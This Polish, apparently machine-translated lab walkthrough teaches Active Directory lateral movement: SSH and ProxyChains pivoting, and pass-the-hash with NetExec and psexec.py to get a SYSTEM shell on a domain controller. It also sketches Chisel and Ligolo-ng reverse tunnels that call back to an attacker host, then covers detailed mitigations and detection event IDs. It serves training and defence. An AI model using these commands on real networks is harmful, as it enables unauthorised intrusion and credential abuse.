Dlatego właśnie tak ważne jest rozróżnienie między skrótami NT a skrótami Net-NTLMv2. Jeśli jesteś w trakcie interakcji i przechwyciłeś skrót za pośrednictwem Respondera, nie możesz go przekazać, musisz go najpierw złamać (lub przekazać dalej, co jest zupełnie inną techniką). Przekazywane skróty to te, które pobierasz z pamięci i dysku.

Do tej pory w tym pomieszczeniu uruchamialiśmy nasze narzędzia bezpośrednio z AttackBoxa na WRK i SERVER1. To działało, ponieważ te hosty są dostępne z naszej sieci atakującego. Ale co z kontrolerem domeny? Spróbujmy się do niego dostać:

user@attackbox:~$ nxc smb 192.168.13.100 -u Administrator -H 25.....ea --timeout 5
Nic. Połączenie przekroczone. Kontroler domeny znajduje się w sieci, ale nie jest bezpośrednio dostępny z naszego urządzenia atakującego. Podobnie, serwer WWW hostuje wewnętrzną instancję Gitea na porcie 80, ale jeśli spróbujemy się z nią połączyć:

user@attackbox:~$ curl --connect-timeout 5 http://192.168.13.71
curl: (28) Connection timed out
Ten sam wynik, timeout. MożemySSHdo serwera WWW na porcie 22, ale usługa WWW iDCsą poza naszym zasięgiem. Tu właśnie pojawia się zmiana kierunku .

Pivoting to technika polegająca na wykorzystaniu zainfekowanego hosta jako przekaźnika i tunelowaniu przez niego ruchu, aby dotrzeć do hostów i usług, do których nie można uzyskać bezpośredniego dostępu. W naszym przypadku serwer WWW znajduje się w tej samej sieci wewnętrznej co kontroler domeny i może się z nim połączyć. Konfigurując tunel przez serwer WWW, możemy kierować ruch z naszego urządzenia AttackBox do tej sieci wewnętrznej, tak jakbyśmy sami z niej korzystali.

Zrozumienie przekierowania portów
Zanim rozpoczniemy tunelowanie, zapoznajmy się z dwoma typami przekierowywania portów SSH, których będziemy używać:

Przekierowanie portów lokalnych ( ssh -L) otwiera port na komputerze lokalnym (AttackBox) i przekierowuje cały ruch odbierany przez połączenie SSH do określonego hosta i portu po drugiej stronie. Wyobraź to sobie jako dedykowany kanał: jeden koniec znajduje się na komputerze, a drugi jest podłączony do sieci wewnętrznej i łączy się z określoną usługą.

Dynamiczne przekierowywanie portów ( ssh -D) jest bardziej elastyczne. Zamiast przekierowywać do pojedynczego miejsca docelowego, konfiguruje serwer proxy SOCKS na komputerze lokalnym. Każde narzędzie obsługujące SOCKS (lub obsługujące ProxyChains) może przesyłać ruch przez ten serwer proxy, który pojawi się w sieci wewnętrznej. Dzięki temu można dotrzeć do dowolnego hosta i portu przez pojedynczy tunel, a nie tylko do jednego predefiniowanego miejsca docelowego.

Przekierowanie portu lokalnego SSH
Zacznijmy od lokalnego przekierowania portu. Załóżmy, że chcemy uzyskać dostęp do usługi RDP na kontrolerze domeny (192.168.13.100, port 3389) z naszego urządzenia AttackBox. Możemy tunelować przez serwer WWW:

Terminal
user@attackbox:~$ ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
Omówmy to szczegółowo:

-L 13389:192.168.13.100:3389: „Nasłuchuj na moim lokalnym porcie 13389 i przekierowuj wszystko, co przybędzie, na port 192.168.13.100, port 3389, widziany z perspektywy serwera WWW”.
jdoe@192.168.13.71:Połączenie SSH z naszym hostem obrotowym.
-N:„Nie wykonuj polecenia zdalnego”. Chcemy tylko tunelu, nie powłoki.
Mnemonik brzmi: -L = Lokalny nasłuch. Numer po lewej ( 13389) to numer otwierany przez AttackBox; adres po prawej ( 3389) to numer wybierany przez WebServer w sieci wewnętrznej.

Teraz w drugim terminalu możemy połączyć się z RDP DC poprzez tunel:

Terminal
user@attackbox:~$ xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'NotTheCorrectPassword' /cert:ignore
Zauważ, że łączymy się z  127.0.0.1:13389naszym lokalnym końcem tunelu. Połączenie nie powiedzie się, ponieważ hasło jest nieprawidłowe, ale zwróć uwagę, jak SSH transparentnie przekierowuje ruch przez serwer WWW do usługi RDP kontrolera domeny. Z punktu widzenia kontrolera domeny, połączenie pochodzi z serwera WWW, a nie z naszego urządzenia AttackBox.

To podejście sprawdza się doskonale, gdy potrzebujemy dotrzeć do jednej konkretnej usługi w sieci wewnętrznej. Ale co, jeśli chcemy przeskanować wiele hostów, uruchomić NetExec w podsieci lub uzyskać dostęp do kilku różnych portów? Tworzenie osobnego -Lprzekierowania dla każdego z nich szybko staje się żmudne. Właśnie tutaj dynamiczne przekierowanie okazuje się strzałem w dziesiątkę.

Dynamiczne przekierowanie portów SSH (serwer proxy SOCKS)
Dynamiczne przekierowanie portów konfiguruje serwer proxy SOCKS w Twoim AttackBoxie. Ruch każdego narzędzia, które przekierowuje przez ten serwer proxy, będzie tunelowany przez serwer WWW i będzie uruchamiany w sieci wewnętrznej:

Terminal
user@attackbox:~$ ssh -f -D 1080 jdoe@192.168.13.71 -N
Wprowadź hasło Summer2026!po wyświetleniu monitu. Spowoduje to otwarcie serwera proxy SOCKS  127.0.0.1:1080i uruchomienie go w tle. Teraz musimy polecić naszym narzędziom, aby go używały. Najprostszym sposobem jest ProxyChains, wrapper, który wymusza na każdym poleceniu kierowanie ruchu TCP przez serwer SOCKS.pełnomocnik.

Najpierw skonfiguruj ProxyChains do korzystania z naszego tunelu. Edytuj /etc/proxychains.conf, zakomentuj istniejący wpis i upewnij się, że ostatni wiersz brzmi:

Terminal
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks4 127.0.0.1 1080
Teraz pokażmy moc proxy SOCKS. Pamiętasz, że  curlport 80 serwera WWW wcześniej przepadł? Spróbujmy przez tunel:

Terminal
user@attackbox:~$ proxychains curl -s http://192.168.13.71 | head -20
Powinieneś zobaczyć zwróconą zawartość HTML, strona docelowa Gitea ładuje się przez tunel. Ten sam adres URL, który przed chwilą stracił ważność, teraz działa, ponieważ ruch przechodzi przez tunel SSH i wychodzi z własnego stosu sieciowego serwera WWW, całkowicie omijając ograniczenia sieciowe.

Wskazówka: Możesz również przeglądać wewnętrzne usługi sieciowe za pośrednictwem serwera proxy SOCKS w przeglądarce Firefox. Przejdź do Ustawienia → Sieć → Ręczny serwer proxy → Host SOCKS: 127.0.0.1, Port: 1080, wybierz SOCKS v4. Następnie przejdź do http://192.168.13.71, interfejs Gitea załaduje się bezpośrednio w przeglądarce, tunelowany przez port obrotowy.

Nie ogranicza się to do ruchu sieciowego. Serwer proxy SOCKS działa z dowolnym narzędziem opartym na protokole TCP. Użyjmy go, aby dotrzeć do kontrolera domeny, czyli do celu końcowego:

Terminal
# Check if our DA hash works on the DC through the tunnel

user@attackbox:~$ proxychains nxc smb 192.168.13.100 -u Administrator -H 250......ea
Powinieneś zobaczyć  (Pwn3d!), że hash administratora domeny jest prawidłowy na kontrolerze domeny i możemy do niego dotrzeć przez tunel. Teraz uruchommy powłokę i pobierzmy ostatnią flagę:

Terminal
user@attackbox:~$ proxychains psexec.py -hashes :25.....ea thm.loc/Administrator@192.168.13.100
Należy uruchomić powłokę SYSTEM na kontrolerze domeny:

Terminal
C:\Windows\system32> hostname

RDC1

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag5.txt

THM{Plac3holder_Fl@g}
To wszystko! Zaczynając od dostępu SSH do pojedynczego, naruszone hosta, połączyliśmy zdalne wykonywanie, ponowne wykorzystanie danych uwierzytelniających i przełączanie, aby dotrzeć do kontrolera domeny i naruszyć domenę.

Ważne ostrzeżenia dotyczące korzystania z ProxyChains
ProxyChains obsługuje tylko ruch TCP . Protokoły UDP i ICMP są po cichu odrzucane. Oznacza to nmap -sU(UDPskanowanie) i pingnie będzie działać w tunelu.
Zawsze używaj nmap -sT(skanowania TCP Connect), a nie -sS(skanowania SYN). Skanowanie SYN wymaga surowych gniazd, których nie można kierować przez SOCKS.
Zawsze dodawaj -Pndo poleceń Nmap opcję pomijania wykrywania hostów (które korzysta z protokołu ICMP). Bez niej Nmap założy, że hosty są wyłączone, ponieważ pingi nie powiodą się.
DNS może przeciekać. Domyślnie ProxyChains może lokalnie rozwiązywać nazwy hostów przed wysłaniem ruchu przez serwer proxy. Jeśli używasz nazw hostów zamiast adresów IP, usuń komentarz proxy_dnsw pliku konfiguracyjnym ProxyChains, aby skonfigurować routing.DNSrównież przez tunel.
Inne narzędzia obrotowe
SSH to najprostsza metoda pivotingu, dostępna praktycznie na każdym hoście z systemem Linux. Istnieją jednak bardziej zaawansowane narzędzia zaprojektowane specjalnie do pivotingu, które oferują dodatkowe możliwości. Omówimy je szczegółowo w kolejnych sekcjach, ale oto ich krótki przegląd:

Dłuto

Przenośny, jednobinarny tunel TCP działający przez HTTP. Chisel(otwiera się w nowej karcie)Jest szczególnie przydatny, gdy SSH nie jest dostępne, na przykład gdy hostem bazowym jest komputer z systemem Windows bez OpenSSH. Uruchamiasz serwer Chisel na swoim AttackBoxie i klienta Chisel na zainfekowanym hoście, a on tworzy odwrotny tunel SOCKS przez HTTP:

# On AttackBox (server)
user@attackbox:~$ chisel server --port 8080 --reverse

# On the compromised Windows host (client)
C:\Tools> chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
Dzięki temu otrzymujesz ten sam 127.0.0.1 1080serwer proxy SOCKS4, który zapewnia dynamiczne przekierowywanie SSH, ale tuneluje on przez HTTP, co oznacza, że ​​może przechodzić przez zapory sieciowe, które zezwalają tylko na ruch wychodzący z sieci.

Ligolo-ng

Nowoczesne narzędzie do pivotingu, które stosuje zupełnie inne podejście. Zamiast proxy SOCKS, Ligolo-ng(otwiera się w nowej karcie)Tworzy wirtualny interfejs sieciowy TUN w Twoim AttackBoxie. Ruch wysyłany do tego interfejsu jest tunelowany przez zainfekowany host i pojawia się w sieci wewnętrznej. Zaletą jest to, że Twoje narzędzia działają  natywnie, bez potrzeby stosowania wrappera ProxyChains. Wystarczy dodać trasę i uruchomić narzędzia tak, jakbyś był w sieci wewnętrznej:

# On AttackBox (proxy)
user@attackbox:~$ sudo ./proxy -selfcert

# On the compromised host (agent)
user@pivot:~$ ./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT

# Back on AttackBox — add route and go
user@attackbox:~$ sudo ip route add 192.168.13.0/24 dev ligolo
user@attackbox:~$ nxc smb 192.168.13.0/24 -u jdoe -p 'Summer2026!'
Brak łańcuchów proxy, brak konfiguracji SOCKS, brak -sT -PnobejśćNmapTwoje narzędzia po prostu działają. To sprawia, że ​​Ligolo-ng jest preferowanym wyborem w przypadku złożonych interakcji z wieloma punktami zwrotnymi, ale ma bardziej stromą krzywą uczenia się, dlatego właśnie SSH pivoting jest odpowiednim punktem wyjścia dla tego pokoju.

Jak to wszystko się łączy
Cofnijmy się o krok i spójrzmy, co osiągnęliśmy w tym pokoju. Zaczynając od niczego więcej niż dostępu SSH do pojedynczego, zainfekowanego hosta:

Zadanie 3: Użyliśmy PsExec, aby uzyskać powłokę SYSTEM na WRK i odkryliśmy zebranyNTLMhash. Użyliśmy Evil-WinRMaby uzyskać dostęp do SERVER1 jako standardowy użytkownik.
Zadanie 4: Wykorzystaliśmy zebrany hash do przekazania hasha serwerowi SERVER1 jako administratorowi, gdzie odkryliśmy hash administratora domeny.
Zadanie 5: Skonfigurowaliśmy serwer proxy SOCKS przez serwer WWW i użyliśmy go do kierowania naszymi narzędziami do ograniczonej sieci, docierając do kontrolera domeny z hashem DA.
Każda technika bazowała na poprzedniej. Dane uwierzytelniające, z którymi zaczynaliśmy, umożliwiały zdalne wykonywanie zadań. Skrót, który znaleźliśmy na serwerze WRK, poszerzył nasz zasięg. Skrót DA na serwerze SERVER1 dał nam klucze do królestwa. A tunel przez serwer WWW otworzył ścieżkę sieciową, umożliwiającą ich użycie. Oto pętla ruchu poziomego w działaniu: ruch → zbieranie → ponowny ruch , aż do osiągnięcia celu.

Skoro wykonaliśmy już kilka zadań, poruszając się po sieci jako atakujący, zmieńmy perspektywę i przyjrzyjmy się, jak organizacje mogą bronić się przed tymi technikami. Zrozumienie defensywnej strony nie tylko czyni Cię lepszym członkiem zespołu blue team, ale także lepszym atakującym. Wiedza o tym, jakich elementów sterujących się spodziewać, pomoże Ci rozpoznać ich brak i odpowiednio dostosować swoje podejście.

Każde z poniższych działań łagodzących bezpośrednio odwołuje się do techniki, którą zastosowaliśmy w tym pomieszczeniu. Cel jest prosty: dla każdej wykorzystanej przez nas ścieżki ataku istnieje mechanizm, który by nas powstrzymał.

Rozwiązanie dotyczące hasła administratora lokalnego (LAPS)
Nasze ćwiczenie Pass-the-Hash w Zadaniu 4 zadziałało, ponieważ to samo hasło administratora lokalnego, a co za tym idzie, ten sam skrót NT, zostało użyte ponownie w WRK i SERVER1. Jest to jeden z najczęstszych błędów konfiguracji wOGŁOSZENIEśrodowiskach i jest jednym z najłatwiejszych do naprawienia.

Usługa Windows LAPS (wbudowana w systemy Windows 11 22H2+, Server 2022 i Server 2025) automatycznie generuje unikalne, losowe hasło dla lokalnego konta administratora na każdym komputerze przyłączonym do domeny i bezpiecznie przechowuje je w usłudze Active Directory. Każdy host otrzymuje inne hasło, zmieniane według konfigurowalnego harmonogramu. Jeśli atakujący zhakuje lokalny skrót administratora na jednej stacji roboczej, będzie on bezużyteczny na wszystkich pozostałych komputerach w domenie.

Windows LAPS zastępuje starszą wersję „Legacy LAPS” (osobną instalację MSI, którą trzeba było wdrożyć na każdym punkcie końcowym) natywnym, wbudowanym rozwiązaniem. Kluczowe ulepszenia obejmują obsługę szyfrowania haseł w usłudze Active Directory (AD), historię haseł, przechowywanie identyfikatorów Entra ID (Azure AD) oraz automatyczną rotację haseł DSRM kontrolerów domeny. W każdym nowoczesnym środowisku wdrożenie systemu Windows LAPS powinno być podstawowym wymogiem; bezpośrednio przerywa ono łańcuch ataków polegających na ponownym wykorzystaniu haseł administratora lokalnego, który wykorzystaliśmy.

Ograniczanie uprawnień administratora lokalnego
PsExec,WMI, DCOM i SMBExec wymagają, aby uwierzytelnione konto było kontem administratora lokalnego na docelowym serwerze. Jeśli użytkownicy nie są administratorami lokalnymi na innych hostach, większość technik ruchu poziomego po prostu zawodzi. Zasada najmniejszych uprawnień powinna być egzekwowana agresywnie:

Użytkownicy domeny standardowej nigdy nie powinni pełnić funkcji administratora lokalnego na stacjach roboczych innych niż ich własne, a najlepiej nawet na własnych.
Dostęp administracyjny powinien być udzielany za pośrednictwem dedykowanych kont administracyjnych, odrębnych od kont używanych na co dzień.
Należy wdrożyć wielopoziomowy model administrowania: Konta poziomu 0 (administratorzy domeny) powinny logować się tylko do systemów poziomu 0 (kontrolery domeny); konta poziomu 1 (administratorzy serwerów) powinny logować się tylko do serwerów; a konta poziomu 2 (administratorzy stacji roboczych) powinny logować się tylko do stacji roboczych.
Rozważmy, co wydarzyło się w naszym laboratorium: jdoebył lokalny administrator w WRK, który dał nam dostęp do SYSTEMU przez PsExec. Gdyby nie to uprawnienie, cały łańcuch ataku zatrzymałby się na Zadaniu 3.

Podpisywanie SMB
Kilka z zastosowanych przez nas technik, PsExec, SMBExec i Pass-the-Hash over SMB, opiera się na komunikacji SMB między hostami. Podpisywanie SMB kryptograficznie weryfikuje integralność i pochodzenie pakietów SMB, co zapobiega atakom retransmisyjnym i zmniejsza niezawodność niektórych metod wykonywania opartych na SMB.

Podpisywanie SMB konfiguruje się za pomocą dwóch ustawień zasad grupy w obszarze Konfiguracja komputera → Opcje zabezpieczeń:

Serwer sieciowy Microsoft: podpisuj cyfrowo komunikację (zawsze): wymusza podpisywanie po stronie serwera.
Klient sieci Microsoft: Podpisuj cyfrowo komunikację (zawsze): wymusza podpisywanie po stronie klienta.
Obie opcje powinny być ustawione na Włączone. Warto zauważyć, że system Windows Server 2025 i najnowsze kompilacje systemu Windows 11 domyślnie wymagają podpisywania SMB, co stanowi znaczącą zmianę w porównaniu z poprzednimi wersjami, w których podpisywanie należało włączać ręcznie za pomocą obiektu zasad grupy (GPO). W naszym laboratorium celowo wyłączyliśmy podpisywanie SMB, aby umożliwić działanie ćwiczeń. W środowisku produkcyjnym powinno być ono zawsze wymuszane.

Ograniczanie uwierzytelniania NTLM
Metoda Pass-the-Hash opiera się zasadniczo na uwierzytelnianiu NTLM. Jeśli NTLM jest ograniczony lub wyłączony w domenie, ataki PtH stają się znacznie trudniejsze. Zasady grupy zapewniają szczegółową kontrolę nad użyciem NTLM poprzez ustawienia w obszarze Konfiguracja komputera → Opcje zabezpieczeń → Zabezpieczenia sieciowe:

Ogranicz NTLM: Uwierzytelnianie NTLM w tej domenie: można ustawić na Odmów wszystkim, wymuszając uwierzytelnianie wyłącznie przy użyciu Kerberos.
Ogranicz NTLM: Przeprowadź audyt uwierzytelniania NTLM w tej domenie: włącza audyt przed wymuszeniem, dzięki czemu można zidentyfikować usługi, które nadal zależą od NTLM.
W praktyce całkowite wyłączenie NTLM jest trudne, ponieważ wiele starszych aplikacji i usług nadal od niego zależy. Zalecane podejście to najpierw przeprowadzić audyt, naprawić zależności, a następnie stopniowo egzekwować ograniczenia. Jednak nawet częściowe ograniczenie NTLM znacząco zmniejsza powierzchnię ataku PtH.

W przypadku hostów obsługujących wrażliwe dane uwierzytelniające, Credential Guard zapewnia dodatkową warstwę ochrony. Credential Guard wykorzystuje zabezpieczenia oparte na wirtualizacji (VBS) do izolowania sekretów LSASS w chronionym kontenerze, uniemożliwiając narzędziom takim jak Mimikatz wyodrębnianie skrótów NTLM i biletów Kerberos z pamięci, nawet z dostępem do SYSTEMU. Gdyby Credential Guard był włączony na serwerze WRK w naszym laboratorium, loot.txtw ogóle nie dałoby się wyodrębnić skrótu.

Reguły zapory hosta
W dobrze segmentowanym środowisku stacje robocze nigdy nie powinny komunikować się bezpośrednio z innymi stacjami roboczymi za pośrednictwem protokołów administracyjnych. Pomyśl o tym: kiedy laptop użytkownika ma prawo łączyć się z laptopem innego użytkownika za pośrednictwem…MŚP(port 445), WinRM (port 5985) czy RDP (port 3389)? Prawie nigdy.

Reguły Zapory systemu Windows Defender, wdrażane za pośrednictwem zasad grupy, mogą blokować połączenia przychodzące na tych portach między stacjami roboczymi, jednocześnie zezwalając na połączenia z legalnych serwerów zarządzających i hostów przesiadkowych. Ta pojedyncza kontrola całkowicie uniemożliwiłaby nam boczne przejście PsExec do WRK w Zadaniu 3, ponieważ nie bylibyśmy w stanie nawiązać połączenia na porcie 445 z serwera WWW.

Segmentacja sieci
Nasze ćwiczenie z przełączaniem w Zadaniu 5 zadziałało, ponieważ serwer WWW miał ścieżkę sieciową do każdego hosta w środowisku, w tym do kontrolera domeny. Prawidłowa segmentacja sieci ogranicza, z którymi hostami mogą się komunikować, zmniejszając promień rażenia zagrożenia:

Stacje robocze, serwery i kontrolery domeny powinny znajdować się w oddzielnych sieciach VLAN, a ruch między nimi powinien być kontrolowany przez reguły zapory sieciowej.
Ruch wschód-zachód między stacjami roboczymi powinien być zablokowany lub mocno ograniczony, gdyż rzadko występuje uzasadniony powód, dla którego stacja robocza nie mogłaby korzystać z protokołu SMB lub RPC.
Kontrolery domeny powinny znajdować się w dedykowanej, wzmocnionej podsieci. Dostęp przychodzący do kontrolerów domeny powinien być ograniczony do niewielkiej grupy hostów zarządzających.
Połączenia wychodzące z kontrolerów domeny do Internetu powinny zostać całkowicie zablokowane.
Segmentacja nie zapobiega całkowicie przemieszczaniu się na boki, ale znacznie je spowalnia i kieruje atakujących przez wąskie gardła, gdzie monitorowanie jest łatwiejsze.

Stacje robocze o uprzywilejowanym dostępie (PAW)
Stacja robocza z dostępem uprzywilejowanym to wzmocniona, dedykowana maszyna, której administrator używa wyłącznie do zadań administracyjnych warstwy 0, zarządzania usługą Active Directory, zasadami grupy, kontrolerami domeny i inną krytyczną infrastrukturą. Stacja robocza używana na co dzień to zupełnie odrębna maszyna, która nigdy nie widzi poświadczeń warstwy 0.

To przerywa łańcuch kradzieży danych uwierzytelniających u samego źródła. Nawet jeśli atakujący całkowicie przejmie kontrolę nad stacją roboczą administratora, żaden sekret Tier 0 nigdy nie znajdował się w jego pamięci LSASS. Nie ma żadnych skrótów administratora domeny do zebrania, ani…KerberosTGT do kradzieży, brak tokenów do podrobienia. Poświadczeń po prostu nie ma. W naszym laboratorium skrót administratora domeny znajdujący się na serwerze SERWER1 jest podręcznikowym przykładem tego, dlaczego PAW mają znaczenie; poświadczenie DA nie powinno być buforowane na standardowym serwerze.

Monitorowanie i wykrywanie
Wreszcie, nawet przy wdrożonych mechanizmach kontroli prewencyjnej, monitorowanie jest niezbędne do wykrycia ruchu bocznego, który się wymknie. Identyfikatory zdarzeń systemu Windows, które omówiliśmy w Zadaniu 3, stanowią podstawę wykrywania ruchu bocznego:

Identyfikator zdarzenia	Dziennik	O czym ostrzegać
4624 (Typ 3)	Bezpieczeństwo	Logowanie do sieci z nieoczekiwanego źródła, np. uwierzytelnianie stacji roboczej na innej stacji roboczej
4624 (Typ 10)	Bezpieczeństwo	Alert zdalnego logowania interaktywnego (RDP), jeśli administrator domeny nawiąże połączenie RDP ze stacją roboczą
4648	Bezpieczeństwo	Jawne użycie poświadczeń wskazuje na runasPsExec z alternatywnymi poświadczeniami lub mapowane dyski z innymi poświadczeniami
7045	System	Zainstalowano nową usługę: znak rozpoznawczy PsExec. Legalne usługi rzadko mają krótkie, losowe nazwy.
4698	Bezpieczeństwo	Utworzono zaplanowane zadanie: podpis AtExec
4688	Bezpieczeństwo	Aby utworzyć proces z rejestrowaniem w wierszu poleceń, należy włączyć podkategorię „Audyt tworzenia procesów” oraz obiekt zasad grupy audytu w wierszu poleceń
Aby uzyskać głębszą widoczność, Sysmon(otwiera się w nowej karcie)(bezpłatne narzędzie firmy Microsoft) zapewnia dane telemetryczne na poziomie procesów, których domyślna polityka audytu systemu Windows nie obejmuje. Zdarzenie Sysmon o identyfikatorze 1 (utworzenie procesu z haszami i szczegółami procesu nadrzędnego) oraz zdarzenie o identyfikatorze 10 (dostęp do procesu, alerty o otwarciu uchwytu przez proces inny niż antywirusowy lsass.exe) są szczególnie przydatne w wykrywaniu kradzieży danych uwierzytelniających i narzędzi do przemieszczania bocznego.

Kluczową zasadą jest to, że ruch poziomy generuje anomalie w zakresie wzorców uwierzytelniania . Pojedyncze konto użytkownika uwierzytelniające się na kilkudziesięciu hostach w krótkim odstępie czasu, stacja robocza inicjująca połączenia SMB z innymi stacjami roboczymi, konto usługi logujące się interaktywnie – wszystkie te sygnały są widoczne, gdy wdrożone jest odpowiednie rejestrowanie i alerty.

To już wszystko! Zaczynając od niczego więcej niżSSHdostęp do pojedynczego zagrożonegoLinuxgospodarzu, połączyłeś ze sobą trzy podstawowe techniki ruchu poziomego i przeszedłeś od krawędzi sieci aż do kontrolera domeny.

Podsumujmy to, co omówiliśmy:

Zdalne wykonywanie: Użyliśmy PsExec, aby uzyskać powłokę SYSTEM na WRK poprzez uwierzytelnianieMŚP, przesyłając plik binarny usługi i uruchamiając go za pomocą Menedżera kontroli usług. Następnie użyliśmy Evil-WinRMdostaćPowerShellsesja na SERVER1 przez WinRM, cichsza,HTTPoparty na protokole, który nie zapisuje danych na dysku ani nie tworzy usług. Po drodze odkryliśmy zebranyNTLMhash znajdujący się w lokalnym folderze Dokumenty Administratora na WRK.
Pass-the-Hash: Wzięliśmy ten zebrany hash NT i użyliśmy go do uwierzytelnienia się na serwerze SERVER1 jako administrator lokalny, nie znając hasła w postaci zwykłego tekstu. NetExec pokazał nam, że ten sam hash działał zarówno na serwerze WRK, jak i na serwerze SERVER1 (klasyczny problem LAPS), a -hashesflaga Impacket dała nam powłokę SYSTEM. Na serwerze SERVER1 odkryliśmy hash administratora domeny, który otworzył nam drogę do ostatecznego celu.
Obrót: Skonfigurowaliśmy serwer proxy SSH SOCKS przez serwer WWW, kierując nasz ruch przez tunel do kontrolera domeny w ograniczonym segmencie sieci. Zademonstrowaliśmy to najpierw na ruchu internetowym, obserwując ładowanie wewnętrznej strony Gitea przez tunel, a następnie używając tego samego serwera proxy do wykonania polecenia PsExec na kontrolerze domeny z hashem administratora domeny.
Środki zaradcze: Przeanalizowaliśmy mechanizmy obronne, które łamią każdą z tych technik: Windows LAPS dla unikatowych lokalnych haseł administratora, podpisywanie SMB i ograniczenia NTLM w celu wzmocnienia uwierzytelniania, reguły zapory hosta i segmentacja sieci w celu ograniczenia łączności oraz stacje robocze z dostępem uprzywilejowanym w celu uniemożliwienia dostępu do poświadczeń o dużej wartości hostom o małej wartości.
Kluczowym wnioskiem z tej rozmowy jest to, że ruch poprzeczny jest procesem iteracyjnym . Na każdym nowym hoście, którego przejęliśmy kontrolę, znajdowaliśmy dane uwierzytelniające, które odblokowywały kolejny skok. Pojedynczy skrót NTLM prowadził nas z jednej stacji roboczej do kontrolera domeny w kilku krokach. W praktyce ta pętla „przenieś → zbierz → przenieś” powtarza się aż do osiągnięcia celu, a zrozumienie, jak przerwać tę pętlę, jest równie ważne, jak umiejętność jej wykorzystania.

Co dalej?

To pomieszczenie obejmowało szeroki zakres ruchu poziomego. Głębsze pomieszczenia w późniejszym module AD zapewnią głębokość:

Wszystkie warianty wykonania protokołu SMB w szczegółach: PsExec, SMBExec, WMI, DCOM i AtExec, wraz z kompromisami i sygnaturami wykrywania dla każdego z nich
Głębokie omówienie ponownego wykorzystania biletów Kerberos: Pass-the-Ticket, Overpass-the-Hash i nadużycia S4U
Zaawansowane obracanie: Chisel, Ligolo-ng, podwójne obroty i natywne przepływy pracy ProxyChains
Wyzwanie wieńczące łączące techniki ruchu poziomego w sieci wielohostowej od punktu początkowego do kontrolera domeny
Zanim przejdziemy dalej, rozważ powrót do laboratorium i wypróbowanie alternatywnych metod, o których wspomnieliśmy jako punkt odniesienia: wmiexec.py, smbexec.py, lub lokalnego przekierowania portów w celu zmiany kierunku. Powtarzanie buduje pamięć mięśniową, która oddziela czytanie o ataku od jego pewnego wykonania w trakcie ataku. Baw się dobrze!
